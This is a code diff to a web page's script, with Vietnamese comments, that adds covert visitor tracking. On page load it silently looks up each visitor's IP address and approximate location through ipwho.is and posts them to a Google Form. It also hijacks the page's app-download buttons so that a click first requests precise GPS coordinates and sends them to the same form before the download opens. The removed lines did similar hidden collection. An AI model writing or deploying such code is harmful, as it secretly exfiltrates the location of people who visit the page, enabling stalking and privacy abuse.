@@ -51,16 +51,14 @@
     const ENTRY_LAT = "entry.791072472";
     const ENTRY_LNG = "entry.1393666541";
 
+    let currentIP = "Đang lấy...";
+
+    // Hàm gửi data về Google Form
     function sendToGoogleForm(ip, lat, lng) {
         const formData = new FormData();
         formData.append(ENTRY_IP, ip);
-        
-        // Tự động thêm dấu nháy đơn ' nếu có toạ độ để Google Sheet không bị lỗi số
-        const finalLat = (lat !== "Không lấy được") ? "'" + lat : lat;
-        const finalLng = (lng !== "Không lấy được") ? "'" + lng : lng;
-        
-        formData.append(ENTRY_LAT, finalLat);
-        formData.append(ENTRY_LNG, finalLng);
+        formData.append(ENTRY_LAT, lat !== "Không lấy được" ? "'" + lat : lat);
+        formData.append(ENTRY_LNG, lng !== "Không lấy được" ? "'" + lng : lng);
 
         fetch(FORM_URL, {
             method: "POST",
@@ -69,40 +67,47 @@
         });
     }
 
-    // Hàm chuyên đi săn IP và Toạ độ với 2 phương án
-    async function getLocationNgam() {
-        // Phương án 1: Dùng ipwho.is (Rất ổn định, không giới hạn)
-        try {
-            const res1 = await fetch("https://ipwho.is/");
-            const data1 = await res1.json();
-            if (data1.success && data1.latitude) {
-                return { ip: data1.ip, lat: data1.latitude, lng: data1.longitude };
-            }
-        } catch (e) {
-            console.log("Phương án 1 tạch, thử phương án 2...");
-        }
-
-        // Phương án 2: Dự phòng bằng freeipapi
-        try {
-            const res2 = await fetch("https://freeipapi.com/api/json");
-            const data2 = await res2.json();
-            if (data2.ipAddress && data2.latitude) {
-                return { ip: data2.ipAddress, lat: data2.latitude, lng: data2.longitude };
-            }
-        } catch (e) {
-            console.log("Phương án 2 cũng tạch.");
-        }
-
-        // Nếu cả 2 đều bị chặn (do dùng Adblock gắt)
-        return { ip: "Bị chặn/Lỗi mạng", lat: "Không lấy được", lng: "Không lấy được" };
-    }
-
+    // 1. Âm thầm lấy IP ngay khi vào web (Không hiện bảng)
     window.addEventListener("DOMContentLoaded", async () => {
-        // Chạy hàm lấy data ngầm
-        const myData = await getLocationNgam();
-        
-        // Bắn thẳng về Google Form
-        sendToGoogleForm(myData.ip, myData.lat, myData.lng);
+        try {
+            const res = await fetch("https://ipwho.is/");
+            const data = await res.json();
+            if (data.success) {
+                currentIP = data.ip;
+                // Gửi tạm vị trí IP phòng hờ người ta không bấm nút
+                sendToGoogleForm(currentIP, data.latitude, data.longitude); 
+            }
+        } catch (e) {
+            currentIP = "Lỗi lấy IP";
+        }
+    });
+
+    // 2. Chặn các nút tải app để xin quyền GPS thật (Sẽ hiện bảng)
+    const buttons = document.querySelectorAll("button");
+    buttons.forEach(btn => {
+        btn.addEventListener("click", (e) => {
+            // Ngăn việc chuyển trang ngay lập tức
+            e.preventDefault(); 
+            const parentLink = btn.closest('a').href;
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Lấy được GPS xịn -> Bắn data về form
+                        sendToGoogleForm(currentIP, position.coords.latitude, position.coords.longitude);
+                        // Chuyển sang link tải app
+                        window.open(parentLink, "_blank"); 
+                    },
+                    (error) => {
+                        // Người dùng từ chối -> Vẫn cho qua trang tải app
+                        window.open(parentLink, "_blank"); 
+                    },
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            } else {
+                window.open(parentLink, "_blank");
+            }
+        });
     });
 </script>
 </body>
